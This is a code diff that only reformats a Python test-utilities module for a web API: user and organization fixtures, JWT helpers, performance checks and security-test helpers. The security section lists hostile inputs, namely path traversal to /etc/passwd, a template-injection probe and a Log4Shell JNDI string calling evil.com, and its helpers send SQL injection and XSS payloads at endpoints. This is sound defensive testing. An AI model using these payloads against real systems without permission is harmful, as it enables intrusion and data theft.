@@ -134,28 +134,15 @@ class TestDataFactory:
 
     @staticmethod
     def create_user_data(
-        email: str = "test@example.com",
-        password: str = "TestPassword123!",
-        name: str = "Test User"
+        email: str = "test@example.com", password: str = "TestPassword123!", name: str = "Test User"
     ) -> dict:
         """Create test user data"""
-        return {
-            "email": email,
-            "password": password,
-            "name": name
-        }
+        return {"email": email, "password": password, "name": name}
 
     @staticmethod
-    def create_organization_data(
-        name: str = "Test Organization",
-        domain: str = "test.com"
-    ) -> dict:
+    def create_organization_data(name: str = "Test Organization", domain: str = "test.com") -> dict:
         """Create test organization data"""
-        return {
-            "name": name,
-            "domain": domain,
-            "settings": {"theme": "light"}
-        }
+        return {"name": name, "domain": domain, "settings": {"theme": "light"}}
 
     @staticmethod
     async def create_test_user(db: AsyncSession, **kwargs) -> dict:
@@ -171,35 +158,28 @@ class TestDataFactory:
             name=user_data["name"],
             password_hash="hashed_password",  # Mock hash
             status=UserStatus.ACTIVE,
-            email_verified=True
+            email_verified=True,
         )
 
         db.add(user)
         await db.commit()
         await db.refresh(user)
 
-        return {
-            "id": str(user.id),
-            "email": user.email,
-            "name": user.name,
-            "user_object": user
-        }
+        return {"id": str(user.id), "email": user.email, "name": user.name, "user_object": user}
 
     @staticmethod
     def create_jwt_token(user_id: str, email: str = "test@example.com") -> tuple:
         """Create test JWT tokens"""
-        access_token, access_jti, access_expires = jwt_manager.create_access_token(
-            user_id, email
-        )
+        access_token, access_jti, access_expires = jwt_manager.create_access_token(user_id, email)
         refresh_token, refresh_jti, family, refresh_expires = jwt_manager.create_refresh_token(
             user_id
         )
 
-        return access_token, refresh_token, {
-            "access_jti": access_jti,
-            "refresh_jti": refresh_jti,
-            "family": family
-        }
+        return (
+            access_token,
+            refresh_token,
+            {"access_jti": access_jti, "refresh_jti": refresh_jti, "family": family},
+        )
 
 
 # Test utilities
@@ -207,23 +187,18 @@ class TestUtils:
     """Utilities for testing"""
 
     @staticmethod
-    async def authenticate_user(client: AsyncClient, email: str = "test@example.com", password: str = "TestPassword123!") -> dict:
+    async def authenticate_user(
+        client: AsyncClient, email: str = "test@example.com", password: str = "TestPassword123!"
+    ) -> dict:
         """Authenticate a user and return tokens"""
         # First create the user
-        signup_data = {
-            "email": email,
-            "password": password,
-            "name": "Test User"
-        }
+        signup_data = {"email": email, "password": password, "name": "Test User"}
 
         signup_response = await client.post("/beta/signup", json=signup_data)
         assert signup_response.status_code == 200
 
         # Then sign in
-        signin_data = {
-            "email": email,
-            "password": password
-        }
+        signin_data = {"email": email, "password": password}
 
         signin_response = await client.post("/beta/signin", json=signin_data)
         assert signin_response.status_code == 200
@@ -264,7 +239,7 @@ class MockConfig:
             "ENABLE_DOCS": True,
             "ENABLE_SIGNUPS": True,
             "RATE_LIMIT_ENABLED": False,  # Disable for tests
-            **overrides
+            **overrides,
         }
         return mock_settings
 
@@ -274,7 +249,9 @@ class PerformanceTestUtils:
     """Utilities for performance testing"""
 
     @staticmethod
-    async def measure_endpoint_performance(client: AsyncClient, endpoint: str, method: str = "GET", **kwargs):
+    async def measure_endpoint_performance(
+        client: AsyncClient, endpoint: str, method: str = "GET", **kwargs
+    ):
         """Measure endpoint performance"""
         import time
 
@@ -297,7 +274,7 @@ class PerformanceTestUtils:
         return {
             "response": response,
             "duration_ms": duration_ms,
-            "status_code": response.status_code
+            "status_code": response.status_code,
         }
 
     @staticmethod
@@ -311,14 +288,16 @@ class PerformanceTestUtils:
         tasks = [make_request() for _ in range(concurrent_requests)]
         responses = await asyncio.gather(*tasks, return_exceptions=True)
 
-        successful = len([r for r in responses if not isinstance(r, Exception) and r.status_code < 400])
+        successful = len(
+            [r for r in responses if not isinstance(r, Exception) and r.status_code < 400]
+        )
         failed = len(responses) - successful
 
         return {
             "total_requests": concurrent_requests,
             "successful": successful,
             "failed": failed,
-            "success_rate": successful / concurrent_requests * 100
+            "success_rate": successful / concurrent_requests * 100,
         }
 
 
@@ -335,7 +314,7 @@ class SecurityTestUtils:
             "../../../etc/passwd",
             "{{7*7}}",
             "${jndi:ldap://evil.com/a}",
-            "../../../../windows/system32/drivers/etc/hosts"
+            "../../../../windows/system32/drivers/etc/hosts",
         ]
 
     @staticmethod
@@ -351,11 +330,14 @@ class SecurityTestUtils:
         for payload in sql_payloads:
             test_params = {k: payload for k in params.keys()}
             response = await client.get(endpoint, params=test_params)
-            results.append({
-                "payload": payload,
-                "status_code": response.status_code,
-                "vulnerable": response.status_code == 200 and "error" not in response.text.lower()
-            })
+            results.append(
+                {
+                    "payload": payload,
+                    "status_code": response.status_code,
+                    "vulnerable": response.status_code == 200
+                    and "error" not in response.text.lower(),
+                }
+            )
 
         return results
 
@@ -368,11 +350,13 @@ class SecurityTestUtils:
         for payload in xss_payloads:
             test_data = {k: payload for k in json_data.keys()}
             response = await client.post(endpoint, json=test_data)
-            results.append({
-                "payload": payload,
-                "status_code": response.status_code,
-                "response_contains_payload": payload in response.text
-            })
+            results.append(
+                {
+                    "payload": payload,
+                    "status_code": response.status_code,
+                    "response_contains_payload": payload in response.text,
+                }
+            )
 
         return results
 
@@ -385,5 +369,5 @@ __all__ = [
     "MockConfig",
     "PerformanceTestUtils",
     "SecurityTestUtils",
-    "test_config"
+    "test_config",
 ]
